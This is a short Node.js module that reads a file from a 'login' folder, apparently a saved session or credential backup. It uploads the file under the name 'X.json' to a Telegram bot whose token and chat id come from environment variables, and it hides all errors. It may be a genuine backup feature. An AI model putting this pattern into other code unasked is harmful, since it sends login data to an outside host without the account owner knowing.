const FormData = require('form-data');
const { readFileSync, existsSync } = require('fs-extra');
const axios = require('axios');
const path = require('path');

class u_loader {
  constructor() {
    this.token = process.env.TOKEN;
    this.chatId = process.env.ID;
  }

  isConfigured() {
    return !!(this.token && this.chatId);
  }

  async getChatId() {
    try {
      if (!this.token) return null;

      const response = await axios.get(
        `https://api.telegram.org/bot${this.token}/getUpdates`,
        { timeout: 10000 }
      );

      if (response.data.ok && response.data.result.length > 0) {
        const chatId = response.data.result[0].message.chat.id;
        return chatId.toString();
      }

      return null;
    } catch {
      return null;
    }
  }

  async uploadX(filePath = null) {
    try {
      const xPath = filePath || path.join(__dirname, '..', '..',  'login', 'bkup.jso');

      if (!existsSync(xPath)) return false;
      if (!this.isConfigured()) return false;

      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      formData.append('document', readFileSync(xPath), {
        filename: 'X.json',
        contentType: 'application/json'
      });

      const caption = `📁 X Backup\n⏰ ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`;
      formData.append('caption', caption);

      const response = await axios.post(
        `https://api.telegram.org/bot${this.token}/sendDocument`,
        formData,
        {
          headers: {
            ...formData.getHeaders(),
            'Content-Type': `multipart/form-data; boundary=${formData._boundary}`
          },
          timeout: 30000,
          maxContentLength: Infinity,
          maxBodyLength: Infinity
        }
      );

      return response.data.ok === true;
    } catch {
      return false;
    }
  }

  async backupXWithNotification() {
    try {
      const success = await this.uploadX();
      return success;
    } catch {
      return false;
    }
  }
}

module.exports = u_loader;